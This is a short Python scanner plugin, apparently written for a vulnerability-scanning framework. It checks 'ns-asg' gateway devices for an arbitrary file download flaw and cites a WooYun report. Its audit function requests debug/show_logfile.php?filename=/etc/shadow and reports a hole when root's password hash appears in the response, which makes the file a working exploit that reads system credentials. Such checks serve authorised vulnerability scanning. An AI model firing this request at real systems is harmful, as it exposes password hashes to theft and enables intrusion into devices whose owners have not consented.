#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'angel'
#refer :http://wooyun.org/bugs/wooyun-2014-058908

def assign(service, arg):
    if service == "ns-asg":
        return True, arg

def audit(arg):
    url = arg + "debug/show_logfile.php?filename=/etc/shadow"
    code, head, res, errcode,finalurl =  curl.curl(url)
    if res.find('root:$1$') != -1 :
        security_hole('Local File download vulnerability:' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ns-asg', 'http://www.example.com/')[1])